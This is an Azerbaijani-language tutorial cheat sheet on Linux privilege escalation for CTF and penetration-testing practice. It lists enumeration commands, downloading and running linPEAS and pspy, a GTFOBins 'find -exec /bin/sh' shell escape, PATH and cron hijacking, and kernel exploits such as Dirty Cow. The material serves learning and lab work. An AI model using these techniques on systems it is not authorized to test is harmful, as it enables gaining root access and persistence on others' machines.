# 🐧 Linux Privilege Escalation – Əhatəli Təhlil və Real-Case Bələdçi

## 📌 Mövzunun İzahı

**Privilege Escalation (Privesc)** – aşağı səlahiyyətli bir istifadəçidən (non-root) sistemdə daha yüksək (root) səlahiyyət əldə etmək texnikalarıdır.

📍 CTF və real-case senarilərində istifadə olunur:
- Shell əldə etdikdən sonra root olmaq üçün
- SUID fayllar, `sudo` icazələri, zəif konfiqurasiya, kernel zəifliklərindən istifadə
- Malware və ya persistence hücumları üçün əhəmiyyətlidir

---

## 🧰 Əsas Alətlər və Komandalar

### 🎯 Sistem Məlumatı
```bash
whoami                 # İstifadəçi kimdir
id                     # UID, GID və qruplar
hostnamectl            # OS və versiya
uname -a               # Kernel versiyası
cat /etc/os-release    # Distribution haqqında info
```

### 🧪 Faydalı Komandalar
```bash
sudo -l                        # Hansi əmrləri sudo ilə icra edə bilər
find / -perm -4000 2>/dev/null   # SUID faylları tap
find / -type f -name "*.sh"     # Scriptləri tap
env                            # Mühit dəyişənləri
ps aux / top                   # Aktiv proseslər
ls -la /tmp /dev/shm           # Yazıla bilən yerlər
```

---

## 🛠️ Ən Güclü Alətlər və İstifadəsi

### 🔎 1. **linPEAS**
- Avtomatik enum üçün əla skript:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 🧠 2. **pspy**
- Cronjob, timer və background prosesləri izləmək üçün:
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

### 📍 3. **Linux Exploit Suggester**
```bash
git clone https://github.com/mzet-/linux-exploit-suggester
perl linux-exploit-suggester.pl
```

### 💥 4. **GTFOBins**
- `find`, `less`, `awk` kimi adi alətlərlə shell almaq:
https://gtfobins.github.io

Misal:
```bash
find . -exec /bin/sh \; -quit
```

---

## 🚀 Advanced Texnikalar

### 1. **SUID Exploits**
```bash
find / -perm -u=s -type f 2>/dev/null
```
Məşhur fayllar:
- `/usr/bin/find`, `/usr/bin/python`, `/usr/bin/bash`

GTFOBins nümunəsi:
```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

### 2. **Weak sudo Permissions**
```bash
sudo -l
```

Məşhur təhlükəli icazələr:
- `sudo tar`, `sudo nmap`, `sudo python` → GTFOBins ilə root almaq olur

### 3. **Cronjob Exploit**
- Yazıla bilən script varsa və `pspy` ilə işləyən cron tapılarsa – shell yerləşdirilə bilər

### 4. **PATH Hijacking**
```bash
echo $PATH
# Əgər cronjob və ya sudo scriplər `unqualified` command çağırırsa, PATH-də shell yerləşdir
```

### 5. **Kernel Exploits**
- Zəif kernel versiyası varsa:
```bash
uname -r
```

Misal exploit:
- Dirty Cow (`dirtycow.c`)
- OverlayFS (`overlayfs.sh`)
- Dirty Pipe (Linux 5.8+)

Əlavə analiz üçün:
```bash
searchsploit linux kernel 3.13
```

---

## 📌 Real-case Ssenarilər və CTF-lər

### 🎯 TryHackMe
- “Linux PrivEsc”
- “Kenobi”
- “Overpass”

### 🎯 HackTheBox
- “Lame” – samba exploit + sudo nmap
- “Cronos” – cronjob hijack
- “Bashed” – script injection və yazıla bilən `webadmin.sh`

---

## 🔁 Addım-addım Privesc Workflow

```bash
# 1. Sistem məlumatı:
whoami && id
uname -a
cat /etc/os-release

# 2. SUDO hüquqları:
sudo -l

# 3. SUID faylları:
find / -perm -4000 2>/dev/null

# 4. Yazıla bilən yerlər:
ls -la /tmp
ls -la /var/tmp

# 5. Cronjob analizi:
pspy64 ilə analiz
crontab -l
ls -la /etc/cron*

# 6. PATH hijack üçün:
echo $PATH

# 7. Kernel version + exploit:
uname -r
perl linux-exploit-suggester.pl

# 8. linPEAS və ya manual təhlil:
./linpeas.sh
```

---

## 📚 Ən Yaxşı Resurslar

- 🔗 [GTFOBins](https://gtfobins.github.io)
- 🧪 [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- 🐧 [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- 📘 TryHackMe Room: “Linux PrivEsc”
- 📘 HTB: Cronos, Lame, Optimum, Bashed
- 🎓 YouTube: IppSec videoları (HTB çözüm videoları)

---

## 🧠 Professional Yanaşma

- Hər zaman aşağıdan yuxarıya düşün: UID=1000 → UID=0
- LinPEAS nəticələrini `.html` və `.txt` ilə saxla, təhlil et
- GTFOBins təcrübən olsun: hər SUID fayl = potensial shell
- “Nothing is useless” – tmp, bash_history, config fayllarını araşdır
- Eksploitdən əvvəl backup al və risk analiz et (real sistemlərdə)

